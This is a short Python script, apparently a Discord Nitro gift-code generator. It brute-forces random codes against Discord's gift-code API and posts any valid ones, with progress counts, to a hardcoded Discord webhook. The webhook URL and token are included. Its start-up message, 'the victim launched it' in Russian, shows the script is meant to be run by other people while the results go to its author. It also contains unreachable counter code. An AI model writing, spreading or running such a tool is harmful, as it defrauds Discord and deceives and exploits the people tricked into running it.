# _               _     _ 
#| |             | |   | |
#| |__   __ _  __| | __| |
#| '_ \ / _` |/ _` |/ _` |
#| |_) | (_| | (_| | (_| |
#|_.__/ \__,_|\__,_|\__,_|

URLWEBHOOK = "https://discord.com/api/webhooks/996350145442619454/LwL76xXOGnz33z_fpyuEXKIC9SZQNHxx0gxAs8h3mYXW0exrre-XeU9-Nk0a63rkCktg"

import random
import string
import requests
import os

from discord_webhook import DiscordWebhook

def main(URLWEBHOOK):
	try:
		webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'Жертва запустила')
		response = webhook.execute()

		i = 0
		valid = 0
		novalid = 0

		while True:
			i += 1
			code = "".join(random.choices(
				string.ascii_uppercase + string.digits + string.ascii_lowercase,
				k = 16
			))

			nitro = "https://discord.gift/" + code
			r = requests.get(f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true")

			if r.status_code == 404:
				continue
				novalid += 1
			if r.status_code == 200:
				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'{nitro}')
				response = webhook.execute()
				valid += 1
			elif i == 10000:
				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'10000 {valid} - valid | {novalid} - InValid')
				response = webhook.execute() 
	except:
		print('INVALID URL')

if __name__ == "__main__":
	main(URLWEBHOOK)